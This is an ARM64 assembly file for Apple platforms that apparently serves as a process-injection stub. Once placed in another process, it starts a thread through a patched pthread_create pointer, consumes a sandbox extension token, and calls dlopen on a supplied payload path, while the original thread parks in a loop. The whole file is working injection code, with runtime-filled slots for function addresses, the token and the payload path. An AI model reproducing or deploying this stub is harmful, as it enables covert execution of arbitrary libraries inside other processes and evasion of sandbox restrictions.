        .section __DATA,__data

        .global _m_start
        .global _m_end
        .global _m_pthread_create_addr
        .global _m_sandbox_consume_addr
        .global _m_dlopen_addr
        .global _m_payload_path
        .global _m_sandbox_token

_m_start:
        sub sp, sp, #0x30
        stp x29, x30, [sp, #0x20]
        add x29, sp, #0x20

        stur w0, [x29, #-0x4]
        str x1, [sp, #0x10]

        add x0, sp, #0x8
        mov x8, #0
        str x8, [sp, #0x8]
        mov x1, x8
        adr x2, m_thread_entry
        paciza x2
        mov x3, x8

        adr x9, _m_pthread_create_addr
        ldr x9, [x9]
        blr x9

        // 0x79616265 ('yabe')
        movz x0, #0x6265
        movk x0, #0x7961, lsl #16

        b .

        .align 4
m_thread_entry:
        pacibsp
        sub sp, sp, #0x30
        stp x29, x30, [sp, #0x20]
        add x29, sp, #0x20

        stur w0, [x29, #-0x4]
        str x1, [sp, #0x10]

        adr x0, _m_sandbox_token
        adr x9, _m_sandbox_consume_addr
        ldr x9, [x9]
        blr x9

        mov x1, #1
        adr x0, _m_payload_path
        adr x9, _m_dlopen_addr
        ldr x9, [x9]
        blr x9

        ldp x29, x30, [sp, #0x20]
        add sp, sp, #0x30
        retab

        .align 3
_m_pthread_create_addr:
        .quad 0x0

        .align 3
_m_sandbox_consume_addr:
        .quad 0x0

        .align 3
_m_dlopen_addr:
        .quad 0x0

        .align 3
_m_payload_path:
        .zero 128

        .align 3
_m_sandbox_token:
        .zero 256

_m_end:
